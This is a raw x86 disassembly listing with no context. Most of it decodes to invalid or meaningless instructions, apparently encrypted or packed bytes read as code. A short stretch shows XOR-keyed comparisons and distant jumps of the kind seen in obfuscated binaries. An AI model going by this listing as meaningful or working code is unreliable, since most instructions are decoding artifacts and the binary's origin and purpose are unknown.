  414432:	xor    al,0x22
  414434:	call   0xba82:0x4a7e9f41
  41443b:	pop    ebx
  41443c:	mov    ebx,0x30baaa09
  414441:	inc    edx
  414442:	dec    ebp
  414443:	imul   ecx,DWORD PTR [edx-0x78],0x294e3e63
  41444a:	in     eax,0x16
  41444c:	bound  edi,QWORD PTR [ebx]
  41444e:	dec    edi
  41444f:	rcl    esi,0xb1
  414452:	pop    ebx
  414453:	inc    ecx
  414454:	cmp    BYTE PTR [esi-0xda32d22],ah
  41445a:	inc    eax
  41445b:	and    eax,0xddedaf37
  414460:	stos   BYTE PTR es:[edi],al
  414461:	data16 add al,BYTE PTR [edx-0x71]
  414465:	dec    esp
  414466:	hlt    
  414467:	mov    ecx,0xb313741a
  41446c:	dec    ecx
  41446d:	das    
  41446e:	mov    ch,0x61
  414470:	xor    ah,ch
  414472:	and    esp,DWORD PTR [esi-0x7c75bc51]
  414478:	dec    eax
  414479:	jne    0x414412
  41447b:	out    dx,al
  41447c:	inc    esi
  41447d:	push   ebx
  41447e:	loopne 0x414412
  414480:	sbb    edx,DWORD PTR [edi]
  414482:	ss clc 
  414484:	xchg   DWORD PTR [ebx+0x6ee60684],esp
  41448a:	push   ds
  41448b:	arpl   WORD PTR [ecx-0x62c6a8ae],ax
  414491:	cmp    ah,BYTE PTR [edx-0x6fae1617]
  414497:	std    
  414498:	in     eax,0x25
  41449a:	sar    al,cl
  41449c:	mov    bh,BYTE PTR [eax-0x67]
  41449f:	and    BYTE PTR cs:[edx-0x272984cf],bh
  4144a6:	repz ss arpl cx,bx
  4144aa:	pusha  
  4144ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ac:	sub    eax,0x62d445e2
  4144b1:	lds    di,DWORD PTR [ebx]
  4144b4:	adc    DWORD PTR [ebx-0x6b],esi
  4144b7:	call   DWORD PTR [ebp+0x10]
  4144ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144bb:	shl    al,0x71
  4144be:	xchg   ecx,eax
  4144bf:	inc    eax
  4144c0:	fist   WORD PTR [edi-0x47]
  4144c3:	std    
  4144c4:	loop   0x4144ca
  4144c6:	lahf   
  4144c7:	outs   dx,DWORD PTR ds:[esi]
  4144c8:	nop
  4144c9:	mov    ecx,0xc9c63ead
  4144ce:	shr    BYTE PTR [edx],cl
  4144d0:	loope  0x4144ba
  4144d2:	cmp    al,0x9f
  4144d4:	into   
  4144d5:	and    DWORD PTR [eax-0x3e],0xfffffffb
  4144d9:	ins    DWORD PTR es:[edi],dx
  4144da:	dec    eax
  4144db:	xchg   ebp,eax
  4144dc:	ins    BYTE PTR es:[edi],dx
  4144dd:	(bad)  
  4144de:	push   0xf83f0b1f
  4144e3:	lock dec esi
  4144e5:	lahf   
  4144e6:	adc    ah,0xbd
  4144e9:	clc    
  4144ea:	lock shr DWORD PTR [ebp+edx*4+0x3d],cl
  4144ef:	xor    DWORD PTR [esi-0x11],ebx
  4144f2:	mov    dh,0x5c
  4144f4:	adc    esp,DWORD PTR [edx]
  4144f6:	fist   DWORD PTR [eax+ecx*2-0x556c767a]
  4144fd:	bound  eax,QWORD PTR [edi]
  4144ff:	(bad)  
  414500:	mov    al,0x1a
  414502:	dec    esi
  414503:	cwde   
  414504:	pop    ecx
  414505:	cdq    
  414506:	loopne 0x4144ba
  414508:	push   cs
  414509:	xchg   edi,eax
  41450a:	es mov edi,0x9d3b3331
  414510:	pop    esp
  414511:	mov    eax,ds:0x77bab0fe
  414516:	loope  0x414549
  414518:	scas   al,BYTE PTR es:[edi]
  414519:	daa    
  41451a:	mov    al,0x35
  41451c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41451d:	int3   
  41451e:	add    al,0x87
  414520:	(bad)  [edi+0x1ecfb2ab]
  414526:	jne    0x41459b
  414528:	adc    al,BYTE PTR [ecx-0x47b59284]
  41452e:	sahf   
  41452f:	addr16 aad 0xea
  414532:	retf   0xfb65
  414535:	fisubr WORD PTR [ebx+0x6f]
  414538:	cmp    DWORD PTR [ebp-0x3c39145a],edi
  41453e:	jecxz  0x414561
  414540:	mov    DWORD PTR [eax-0x689481c9],eax
  414546:	add    eax,0x13fe8340
  41454b:	daa    
  41454c:	xor    eax,0x99d6f81
  414551:	mov    ch,0xf6
  414553:	lods   eax,DWORD PTR ds:[esi]
  414554:	fsub   st,st(3)
  414556:	add    BYTE PTR [edx+0x3],cl
  414559:	fsubr  DWORD PTR [esi+0x79e9d81f]
  41455f:	fwait
  414560:	pop    es
  414561:	ds dec ecx
  414563:	pop    edx
  414564:	js     0x41450f
  414566:	cmp    eax,0x54c83565
  41456b:	xor    BYTE PTR [ecx+ecx*1+0x5e],ch
  41456f:	push   esi
  414570:	jns    0x414545
  414572:	or     bl,BYTE PTR [ebx]
  414574:	pop    esi
  414575:	fisubr WORD PTR [ecx+0x72e9b19f]
  41457b:	mov    edi,0xb79472d8
  414580:	inc    esi
  414581:	pop    ebx
  414582:	call   0xc402a765
  414587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414588:	mov    ebp,0x5f4384ea
  41458d:	pop    sp
  41458f:	gs gs inc edi
  414592:	(bad)  
  414593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414594:	or     al,al
  414596:	jae    0x41459e
  414598:	icebp  
  414599:	loope  0x41456a
  41459b:	sub    eax,0xd07ec43e
  4145a0:	jo     0x4145c4
  4145a2:	dec    ebx
  4145a3:	pop    es
  4145a4:	xor    ebp,ebp
  4145a6:	mov    ds:0x8eeadc22,al
  4145ab:	jnp    0x4145cb
  4145ad:	iret   
  4145ae:	data16 mov bl,0x88
  4145b1:	add    bl,ch
  4145b3:	inc    esp
  4145b4:	hlt    
  4145b5:	dec    ebx
  4145b6:	xlat   BYTE PTR ds:[ebx]
  4145b7:	push   esi
  4145b8:	test   edx,0xc30dc3f3
  4145be:	add    BYTE PTR [esi+0x5f],0x85
  4145c2:	(bad)  
  4145c3:	ret    0xeeb2
  4145c6:	inc    ebx
  4145c7:	add    DWORD PTR [ebx-0x354be3a9],0xffffffd4
  4145ce:	sub    eax,0x453d790f
  4145d3:	xchg   edx,eax
  4145d4:	cmp    DWORD PTR [esp+edx*1-0x67],0x3cb8f825
  4145dc:	cmp    esp,DWORD PTR [eax-0x45b7942b]
  4145e2:	dec    edx
  4145e3:	mov    ah,0x3
  4145e5:	in     eax,0xf5
  4145e7:	inc    esi
  4145e8:	push   cs
  4145e9:	adc    DWORD PTR [ebp-0x13],ebx
  4145ec:	popa   
  4145ed:	addr16 push eax
  4145ef:	int3   
  4145f0:	(bad)  
  4145f1:	mov    ds:0x3f1b3607,al
  4145f6:	(bad)  
  4145f7:	mov    DWORD PTR [ebx+0x48338ae5],edi
  4145fd:	popf   
  4145fe:	lods   eax,DWORD PTR ds:[esi]
  4145ff:	stos   BYTE PTR es:[edi],al
  414600:	jo     0x4145df
  414602:	mov    al,0x59
  414604:	scas   eax,DWORD PTR es:[edi]
  414605:	jns    0x414625
  414607:	inc    edx
  414608:	xlat   BYTE PTR ds:[ebx]
  414609:	jno    0x4145ec
  41460b:	mov    ebx,0x32d007bc
  414610:	cmp    ah,BYTE PTR [edx+0x19]
  414613:	pop    ss
  414614:	push   edx
  414615:	sub    esp,DWORD PTR [edi-0x51]
  414618:	fcomp  QWORD PTR cs:[eax]
  41461b:	push   eax
  41461c:	lods   al,BYTE PTR ds:[esi]
  41461d:	add    DWORD PTR [ecx+edi*1],ebx
  414620:	xchg   edx,eax
  414621:	cs push ebp
  414623:	jns    0x4145b5
  414625:	push   edi
  414626:	lods   al,BYTE PTR ds:[esi]
  414628:	cwde   
  414629:	mov    eax,0xd677f9ae
  41462e:	pop    eax
  41462f:	mov    ds:0x60164896,al
  414634:	mov    al,ds:0xf07fbe7
  414639:	sahf   
  41463a:	ror    ebx,cl
  41463c:	ss int3 
  41463e:	add    dl,BYTE PTR [esi]
  414640:	(bad)  
  414641:	xor    DWORD PTR [ebp+0x31],eax
  414644:	cmp    BYTE PTR [ecx+0x5],al
  414647:	imul   esi
  414649:	dec    eax
  41464a:	push   es
  41464b:	jecxz  0x41463a
  41464d:	mov    ds,WORD PTR [esi+eiz*2+0x32]
  414651:	lods   eax,DWORD PTR ds:[esi]
  414652:	mov    esi,0x9f9ef7d0
  414657:	inc    ecx
  414658:	and    DWORD PTR [ecx+0x4800dd56],ebp
  41465e:	test   DWORD PTR [ebx+0x28],edx
  414661:	adc    BYTE PTR [edi],ah
  414663:	js     0x414623
  414665:	pushf  
  414666:	fiadd  WORD PTR [esi]
  414668:	sbb    DWORD PTR [esi],eax
  41466a:	dec    ecx
  41466b:	pushf  
  41466c:	inc    edx
  41466d:	adc    BYTE PTR [ebx],ah
  41466f:	and    eax,0x53787504
  414674:	sbb    BYTE PTR [esi+0x62],0xeb
  414678:	mov    bl,0xd7
  41467a:	sub    al,0x45
  41467c:	imul   esp,DWORD PTR [edi+edx*2+0x2beb7765],0xa7ee6eef
  414687:	pop    edi
  414688:	inc    ebx
  414689:	sub    eax,0x7af0bd2d
  41468e:	or     DWORD PTR [edi+0x8],eax
  414691:	inc    ecx
  414692:	fist   WORD PTR [edx]
  414694:	mov    ch,0xca
  414696:	sbb    ah,0x2d
  414699:	push   cs
  41469a:	push   ebx
  41469b:	fst    DWORD PTR [edx+0xb5d916c]
  4146a1:	stos   DWORD PTR es:[edi],eax
  4146a2:	lods   eax,DWORD PTR ds:[si]
  4146a4:	push   ebx
  4146a5:	xor    eax,0xeea94f8d
  4146aa:	dec    sp
  4146ac:	dec    edi
  4146ad:	out    0xaf,eax
  4146af:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4146b1:	mov    ds:0xbbd594f0,eax
  4146b6:	inc    ebx
  4146b7:	pop    esp
  4146b8:	cmp    eax,0x87c0a3ac
  4146bd:	xchg   ebp,eax
  4146be:	ins    BYTE PTR es:[edi],dx
  4146bf:	daa    
  4146c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146c1:	(bad)
  4146c5:	adc    edi,edx
  4146c7:	sub    ch,BYTE PTR [ecx+0xa0019e]
  4146cd:	mov    ds:0x4aebe1e4,eax
  4146d2:	bound  ebp,QWORD PTR [edx]
  4146d4:	sbb    edx,DWORD PTR [edx+0x79]
  4146d7:	call   0xf43a98fa
  4146dc:	fcom   DWORD PTR [esi]
  4146de:	out    dx,eax
  4146df:	sub    al,0x98
  4146e1:	mov    al,ds:0xa9488c0b
  4146e6:	jne    0x414679
  4146e8:	std    
  4146e9:	and    DWORD PTR [ebp+0x0],eax
  4146ec:	xchg   ecx,eax
  4146ed:	retf   
  4146ee:	in     al,0x66
  4146f0:	retf   0x7959
  4146f3:	dec    ebx
  4146f4:	or     edx,DWORD PTR [eax+0x79ecb1d1]
  4146fa:	push   esi
  4146fb:	ss inc ecx
  4146fd:	or     ch,cl
  4146ff:	arpl   WORD PTR [ecx],sp
  414701:	rcl    DWORD PTR [eax+0x3de83cd4],cl
  414707:	scas   eax,DWORD PTR es:[edi]
  414708:	imul   ebx,DWORD PTR [esi],0x950a222a
  41470e:	pop    ebx
  41470f:	mov    ch,0xc4
  414711:	pop    ss
  414712:	lds    esp,FWORD PTR [eax+0x62379c87]
  414718:	add    ch,BYTE PTR ss:[edi]
  41471b:	retf   
  41471c:	add    dl,BYTE PTR [esi]
  41471e:	retf   0xf117
  414721:	mov    al,ds:0x978e28a5
  414726:	jle    0x4147a2
  414728:	cs test ebp,ecx
  41472b:	push   eax
  41472c:	or     eax,0x516a278c
  414731:	xchg   esp,eax
  414732:	mov    dh,0xca
  414734:	jmp    0xfe96e2ea
  414739:	cdq    
  41473a:	push   ecx
  41473b:	inc    esp
  41473c:	sbb    al,0x86
  41473e:	aam    0x61
  414740:	aaa    
  414741:	fnsave [ecx]
  414743:	pop    edi
  414744:	sub    BYTE PTR [ebp-0xe7f19e3],0xc2
  41474b:	mov    ds:0x2d00e0ea,eax
  414750:	popf   
  414751:	inc    ecx
  414752:	jmp    0x4147bc
  414754:	and    cl,BYTE PTR [ecx]
  414756:	sub    al,0x95
  414758:	cmc    
  414759:	sub    edx,ebp
  41475b:	dec    eax
  41475c:	jb     0x4147b1
  41475e:	gs jb  0x414712
  414761:	sti    
  414762:	outs   dx,BYTE PTR ds:[esi]
  414763:	sahf   
  414764:	sbb    eax,0x5d919ccf
  414769:	add    BYTE PTR [ecx],dl
  41476b:	call   0xd34:0x7d3fa29d
  414772:	out    dx,al
  414773:	jge    0x41479b
  414775:	add    al,BYTE PTR [esi]
  414777:	pop    ebp
  414778:	pop    esi
  414779:	adc    BYTE PTR [ebx+0x6b],cl
  41477c:	sub    ax,0x3fb1
  414780:	jmp    0xa4e8:0x922445b2
  414787:	dec    ebp
  414788:	sbb    eax,0x97ca92cb
  41478d:	shl    DWORD PTR [edi],cl
  41478f:	pop    edi
  414790:	cdq    
  414791:	sbb    eax,0x4eae4aaf
  414796:	imul   BYTE PTR [ecx+0x5effac8a]
  41479c:	ins    BYTE PTR es:[edi],dx
  41479d:	pop    ds
  41479e:	in     al,dx
  41479f:	adc    edi,DWORD PTR [esi+0x5b]
  4147a2:	mov    cl,0x64
  4147a4:	adc    eax,0xe5b3bcc
  4147a9:	int    0xbc
  4147ab:	mov    BYTE PTR [esi+0x51177c07],dl
  4147b1:	aam    0x27
  4147b3:	das    
  4147b4:	jne    0x414774
  4147b6:	jecxz  0x414837
  4147b8:	popa   
  4147b9:	mov    al,ds:0x2ebe5cf4
  4147be:	mov    bh,0xa5
  4147c0:	xchg   BYTE PTR [ecx+ecx*2-0x476b9e2d],ah
  4147c7:	or     BYTE PTR [edx+ecx*4],0xd7
  4147cb:	inc    ecx
  4147cc:	sbb    al,BYTE PTR [edi+ecx*2]
  4147cf:	adc    eax,0x725dc65b
  4147d4:	push   eax
  4147d5:	ins    DWORD PTR es:[edi],dx
  4147d6:	xchg   ebp,eax
  4147d7:	xchg   edi,eax
  4147d8:	mov    BYTE PTR [eax-0x7da414a3],dl
  4147de:	pop    esi
  4147df:	jnp    0x414832
  4147e1:	mov    eax,?
  4147e3:	call   0xe4f9:0xe3ecb8d4
  4147ea:	xor    al,0x2
  4147ec:	pushf  
  4147ed:	nop
  4147ee:	pusha  
  4147ef:	jp     0x4147a6
  4147f1:	adc    DWORD PTR [edx-0x45],edi
  4147f4:	push   ds
  4147f5:	fisub  WORD PTR [edi+0x79187e99]
  4147fb:	imul   DWORD PTR [ecx-0x4c]
  4147fe:	xchg   DWORD PTR [ebp-0x58],edx
  414801:	test   eax,0x4cabe4c1
  414806:	test   BYTE PTR [ecx+edi*4+0x53],dh
  41480a:	xchg   esp,eax
  41480b:	xchg   BYTE PTR [edx],bl
  41480d:	xchg   BYTE PTR [ebx],al
  41480f:	and    esi,DWORD PTR [bx+si+0x7929]
  414814:	jecxz  0x414863
  414816:	adc    DWORD PTR [ebx],edx
  414818:	repnz imul ecx,DWORD PTR [edx+ecx*2+0x69],0xa21cedfa
  414821:	xchg   edx,eax
  414822:	push   ss
  414823:	mov    esi,0xad6a4462
  414828:	mov    eax,ds:0x5f0a077b
  41482d:	aad    0xc0
  41482f:	add    DWORD PTR [ecx+0x68765149],ebx
  414835:	jl     0x4147e0
  414837:	dec    eax
  414838:	jne    0x414815
  41483a:	ds push 0x2e
  41483d:	push   es
  41483e:	frstor [esi-0x7dce101e]
  414844:	dec    esp
  414845:	call   0xc44ad2a0
  41484a:	cmc    
  41484b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41484c:	lahf   
  41484d:	(bad)  
  41484e:	cmp    eax,0xad9fcf5c
  414853:	sti    
  414854:	inc    edx
  414855:	dec    esi
  414856:	dec    ebx
  414857:	jo     0x41486b
  414859:	sub    BYTE PTR [esp+ebp*1+0x40e9c416],ch
  414860:	mov    al,ds:0x51a3ed1e
  414865:	cmp    dl,ah
  414867:	repnz dec edi
  414869:	push   ebx
  41486a:	popa   
  41486b:	inc    ebp
  41486c:	sbb    eax,0x405dd90e
  414871:	ds mov ecx,0x60d05d31
  414877:	mov    esp,0x5a69d7b5
  41487c:	mov    edx,0xa7779cc9
  414881:	mov    al,0x41
  414883:	pop    ss
  414884:	aas    
  414885:	call   0x3949:0x2080b4ea
  41488c:	push   es
  41488d:	xlat   BYTE PTR ds:[ebx]
  41488e:	sbb    al,0xd4
  414890:	test   BYTE PTR [ebx+ebp*1+0x19f7e909],al
  414897:	rcr    edi,cl
  414899:	push   ss
  41489a:	in     al,0xc6
  41489c:	ds (bad) 
  41489e:	fs loop 0x414880
  4148a1:	sub    DWORD PTR [ebx],ebx
  4148a3:	sbb    eax,0xdb58a239
  4148a8:	jne    0x4148e8
  4148aa:	mov    esi,ecx
  4148ac:	dec    ecx
  4148ad:	and    eax,0x915d233
  4148b2:	fmul   DWORD PTR [edx]
  4148b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b5:	mov    edx,DWORD PTR [ebp+0x8]
  4148b8:	xor    edx,eax
  4148ba:	add    edx,esi
  4148bc:	jne    0x4124e5
  4148c2:	mov    edx,DWORD PTR [ebp-0xc]
  4148c5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148cc:	mov    bl,BYTE PTR [ebp-0x1]
  4148cf:	cmp    dl,bl
  4148d1:	je     0x416d0f
  4148d7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148da:	mov    edx,DWORD PTR [ebp-0xc]
  4148dd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4148e4:	mov    ebx,DWORD PTR [ebp+0xc]
  4148e7:	xor    ecx,eax
  4148e9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f5]
  4148f0:	jne    0x4191a3
  4148f6:	mov    ecx,DWORD PTR [ebp-0x5c]
  4148f9:	mov    edx,DWORD PTR [ebp+0xc]
  4148fc:	xor    ecx,eax
  4148fe:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f5]
  414906:	mov    edx,DWORD PTR [ebp-0x18]
  414909:	xor    edx,eax
  41490b:	add    edx,esi
  41490d:	cmp    ecx,edx
  41490f:	mov    ecx,DWORD PTR [ebp-0x14]
  414912:	mov    DWORD PTR [ebp+0x8],ecx
  414915:	mov    ecx,DWORD PTR [ebp+0x8]
  414918:	je     0x41b60b
  41491e:	xor    ecx,eax
  414920:	add    ecx,esi
  414922:	mov    ecx,0x242ebf1
  414927:	je     0x416d97
  41492d:	mov    edx,DWORD PTR [ebp+0x8]
  414930:	jmp    0x416c90
  414935:	jo     0x414954
  414937:	cmc    
  414938:	dec    eax
  414939:	or     BYTE PTR [eax-0x4213ea36],0xb0
  414940:	sub    eax,0x33a6465c
  414945:	mov    ecx,0x3e838069
  41494a:	pop    esi
  41494b:	add    DWORD PTR [ebx+0x79a91aa4],0x38
  414952:	arpl   WORD PTR [esi],si
  414954:	pop    ss
  414955:	jge    0x414941
  414957:	pop    edx
  414958:	aas    
  414959:	jbe    0x414965
  41495b:	mov    ebp,0xec65a203
  414960:	mov    dh,0xe
  414962:	cld    
  414963:	and    ebp,DWORD PTR [ecx+esi*8]
  414966:	jg     0x4149c3
  414968:	in     eax,0xfb
  41496a:	and    BYTE PTR ds:0x645945f9,0x30
  414971:	adc    BYTE PTR ds:0x5d947bf8,dh
  414977:	test   al,0xe6
  414979:	xor    dh,BYTE PTR [ecx+0x66]
  41497c:	jecxz  0x41496a
  41497e:	pop    ds
  41497f:	rol    DWORD PTR [ecx],0xb5
  414982:	dec    eax
  414983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414984:	or     ebx,edi
  414986:	mov    dl,0xe2
  414988:	mov    dl,0xed
  41498a:	xlat   BYTE PTR ds:[ebx]
  41498b:	inc    edi
  41498c:	cmp    eax,0x3cfb0066
  414991:	inc    ecx
  414992:	and    DWORD PTR [ecx+0x78],esi
  414995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414996:	pop    eax
  414997:	mov    bh,0x58
  414999:	xchg   esp,eax
  41499a:	mov    al,ah
  41499c:	xor    eax,0x93371c0c
  4149a1:	and    al,0x9c
  4149a3:	ss sahf 
  4149a5:	push   ss
  4149a6:	inc    eax
  4149a7:	fpatan 
  4149a9:	add    al,BYTE PTR [ebx]
  4149ab:	inc    edi
  4149ac:	lods   al,BYTE PTR ds:[esi]
  4149ad:	inc    eax
  4149ae:	dec    DWORD PTR [esi+ecx*2-0xb6691bc]
  4149b5:	add    eax,0x5d05d4bc
  4149ba:	push   esi
  4149bb:	jg     0x4149c9
  4149bd:	cmp    bh,bl
  4149bf:	dec    ecx
  4149c0:	or     DWORD PTR cs:[ebx+0x7e1c2dca],ecx
  4149c7:	pop    ebp
  4149c8:	ror    BYTE PTR [edi+0x2fe0a04b],0xb5
  4149cf:	jno    0x41496a
  4149d1:	pop    eax
  4149d2:	add    DWORD PTR [ebp+0x678d7c66],edx
  4149d8:	(bad)  
  4149db:	fs popf 
  4149dd:	jecxz  0x414a14
  4149df:	imul   eax,DWORD PTR [esi-0x3c1c18c5],0xe33249ca
  4149e9:	popa   
  4149ea:	ja     0x4149c4
  4149ec:	xor    ebp,edi
  4149ee:	mov    WORD PTR [esi+edx*1+0x7a],cs
  4149f2:	xor    DWORD PTR [ebp+0x68],ebx
  4149f5:	ror    DWORD PTR [eax-0x18],cl
  4149f8:	rcr    BYTE PTR ds:0x1e6da85f,1
  4149fe:	mov    esi,0xe12ec546
  414a03:	inc    ecx
  414a04:	add    eax,0x6275b820
  414a09:	test   eax,0x97c19be8
  414a0e:	iret   
  414a0f:	out    dx,eax
  414a10:	inc    ecx
  414a11:	cdq    
  414a12:	dec    edx
  414a13:	addr16 loope 0x414a11
  414a16:	outs   dx,DWORD PTR ds:[esi]
  414a17:	int3   
  414a18:	xchg   ebx,eax
  414a19:	pop    ebp
  414a1a:	loop   0x414a2b
  414a1c:	(bad)  
  414a1d:	cmp    al,BYTE PTR [eax+eiz*4]
  414a20:	cld    
  414a21:	ret    
  414a22:	dec    ecx
  414a23:	xor    ecx,esi
  414a25:	mov    cx,0xba09
  414a29:	cmp    bl,BYTE PTR cs:[ecx+0x233a5493]
  414a30:	dec    esp
  414a31:	jae    0x414a09
  414a33:	jae    0x414aa7
  414a35:	xor    DWORD PTR [ecx-0x58],edx
  414a38:	push   eax
  414a39:	in     al,dx
  414a3a:	adc    DWORD PTR [edi+eiz*8],0xc725ce24
  414a41:	test   DWORD PTR [ebx],ebp
  414a43:	mov    ss,WORD PTR [esi]
  414a45:	push   0x54b51309
  414a4a:	imul   ebp,DWORD PTR [edx-0x37],0x3b7567c5
  414a51:	rcl    ah,1
  414a53:	jge    0x414a20
  414a55:	inc    edx
  414a56:	add    al,0x41
  414a58:	dec    eax
  414a59:	out    dx,al
  414a5a:	test   ch,dl
  414a5c:	scas   eax,DWORD PTR es:[edi]
  414a5d:	add    BYTE PTR [ebx],0x46
  414a60:	inc    ecx
  414a61:	adc    edx,DWORD PTR [esi+0xe]
  414a64:	inc    esi
  414a65:	dec    esp
  414a66:	add    al,0x44
  414a68:	out    dx,al
  414a69:	or     eax,0x5e38e989
  414a6e:	lock repz fcomip st,st(6)
  414a72:	stos   DWORD PTR es:[edi],eax
  414a73:	repz sub ebx,DWORD PTR [esi]
  414a76:	push   0xe42eeac4
  414a7b:	mov    dh,0xd9
  414a7d:	cdq    
  414a7e:	test   DWORD PTR [edx],0x85baeed1
  414a84:	ds (bad) 
  414a87:	xor    DWORD PTR [esi-0x67],esp
  414a8a:	shr    edi,cl
  414a8c:	loope  0x414a6a
  414a8e:	add    al,0x50
  414a90:	adc    eax,0x699beb68
  414a95:	cmp    eax,0xaa941274
  414a9a:	das    
  414a9b:	imul   DWORD PTR [esi+0x4d]
  414a9e:	xchg   ebx,eax
  414a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa0:	aam    0xb9
  414aa2:	xor    DWORD PTR [ebp+ebx*2-0x1d],0x68c4f0ab
  414aaa:	or     BYTE PTR [eax+eiz*4+0xea18d97],al
  414ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab2:	call   0x47c1:0xd82f9afa
  414ab9:	test   cl,ch
  414abb:	adc    ebx,DWORD PTR [eax]
  414abd:	pop    ds
  414abe:	rol    DWORD PTR [edi-0x4991e0fa],1
  414ac4:	fcomp  QWORD PTR [edx]
  414ac6:	xor    bl,al
  414ac8:	pop    ds
  414ac9:	jne    0x414b15
  414acb:	(bad)  
  414acc:	sub    al,0x32
  414ace:	out    dx,al
  414acf:	stos   BYTE PTR es:[edi],al
  414ad0:	int    0x81
  414ad2:	xor    esp,esp
  414ad4:	pop    edx
  414ad5:	sub    al,0x38
  414ad7:	xchg   ecx,eax
  414ad8:	retf   0xf9f2
  414adb:	mov    ecx,0xbe047781
  414ae0:	sbb    esp,DWORD PTR [edx]
  414ae2:	stos   BYTE PTR es:[edi],al
  414ae3:	bswap  eax
  414ae5:	push   ds
  414ae6:	(bad)  
  414ae7:	stos   DWORD PTR es:[edi],eax
  414ae8:	adc    DWORD PTR [ecx-0x76f151a1],edx
  414aee:	test   al,0x66
  414af0:	cmp    dl,BYTE PTR [esi]
  414af2:	mov    ebx,0x82977ddf
  414af7:	mov    ah,0x4a
  414af9:	push   0x71
  414afb:	jb     0x414ac6
  414afd:	fisttp DWORD PTR [edx-0x7a]
  414b00:	int    0x1
  414b02:	push   eax
  414b03:	cmp    eax,0xa4ea9023
  414b08:	sub    ah,BYTE PTR [esi+ebp*4-0x337fc4ad]
  414b0f:	fidiv  WORD PTR [esi-0x14]
  414b12:	pop    esi
  414b13:	loop   0x414af0
  414b15:	call   0xa141b6c1
  414b1a:	outs   dx,BYTE PTR ds:[esi]
  414b1b:	xor    BYTE PTR [ecx-0x4338c022],cl
  414b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b22:	jecxz  0x414ad4
  414b24:	and    eax,0xcc46818b
  414b29:	push   ss
  414b2a:	(bad)  
  414b2b:	mov    edx,0x76de91b4
  414b30:	data16 jne 0x414b70
  414b33:	push   esp
  414b34:	mov    esp,0x7f3db8a8
  414b39:	sbb    bl,BYTE PTR [esi]
  414b3b:	dec    esi
  414b3c:	jb     0x414af9
  414b3e:	push   ecx
  414b3f:	into   
  414b40:	mov    gs,WORD PTR [edx+0x5f]
  414b43:	mov    ecx,0x9f5f723d
  414b48:	ins    BYTE PTR es:[edi],dx
  414b49:	out    dx,al
  414b4a:	mov    dl,0xb5
  414b4c:	dec    ecx
  414b4d:	and    DWORD PTR [ebp+0x5ec6c9ba],ebp
  414b53:	dec    ebx
  414b54:	test   eax,0x9d77e02b
  414b59:	int3   
  414b5a:	aaa    
  414b5b:	push   0x1e956ca7
  414b60:	popf   
  414b61:	fcom   st(6)
  414b63:	mov    esp,0x649dd201
  414b68:	inc    eax
  414b69:	hlt    
  414b6a:	dec    ecx
  414b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b6c:	ret    
  414b6d:	hlt    
  414b6e:	jmp    0x90a6:0x6d84b973
  414b75:	inc    ebx
  414b76:	sbb    esp,DWORD PTR [eax]
  414b78:	mov    edi,0xc0572364
  414b7d:	mov    bl,0xee
  414b7f:	xchg   ebp,eax
  414b80:	push   0xffffffe7
  414b82:	sti    
  414b83:	js     0x414b84
  414b85:	dec    esp
  414b86:	xchg   ecx,eax
  414b87:	xlat   BYTE PTR ds:[ebx]
  414b88:	pop    esp
  414b89:	jb     0x414b8d
  414b8b:	add    ecx,DWORD PTR [ebp+0xae15da9]
  414b91:	xor    DWORD PTR [ebp+0x49cb5fcd],ebx
  414b97:	(bad)  
  414b98:	(bad)  
  414b99:	call   0x668e:0x259ff6ff
  414ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ba1:	cdq    
  414ba2:	loop   0x414bc2
  414ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ba5:	fdiv   QWORD PTR [edi+0x276b15cd]
  414bab:	adc    DWORD PTR [edx-0x23],0x6d49c22b
  414bb2:	adc    BYTE PTR [esi-0x7a50b69c],0xcb
  414bb9:	adc    eax,0x98ec24de
  414bbe:	dec    edi
  414bbf:	xchg   BYTE PTR [edi-0x8],dl
  414bc2:	les    ecx,FWORD PTR [edx+edi*1-0x2467cf46]
  414bc9:	mov    dl,0x98
  414bcb:	sub    bl,0x92
  414bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bcf:	cmp    al,0x6b
  414bd1:	test   edx,eax
  414bd3:	mov    ch,0xd2
  414bd5:	in     eax,dx
  414bd6:	push   esp
  414bd7:	mov    dl,0x61
  414bd9:	push   edx
  414bda:	nop
  414bdb:	mov    bl,0xec
  414bdd:	adc    al,0x4d
  414bdf:	(bad)  
  414be0:	mov    al,ds:0xb314f91
  414be5:	mov    esi,DWORD PTR [edx+ebx*8+0x1]
  414be9:	jns    0x414ba3
  414beb:	xchg   esi,eax
  414bec:	or     eax,0x92764676
  414bf1:	retf   0xcddf
  414bf4:	xchg   edx,eax
  414bf5:	inc    edx
  414bf6:	lods   eax,DWORD PTR ds:[esi]
  414bf7:	push   es
  414bf8:	and    edi,eax
  414bfa:	or     dl,bl
  414bfc:	stos   BYTE PTR es:[edi],al
  414bfd:	sahf   
  414bfe:	cli    
  414bff:	adc    DWORD PTR [esp+edi*2-0x20be17fa],edi
  414c06:	mov    eax,0xd10cf22a
  414c0b:	cld    
  414c0c:	pop    ecx
  414c0d:	stos   DWORD PTR es:[edi],eax
  414c0e:	sbb    BYTE PTR [ecx+0x34],bl
  414c11:	push   ebx
  414c12:	js     0x414bcd
  414c14:	daa    
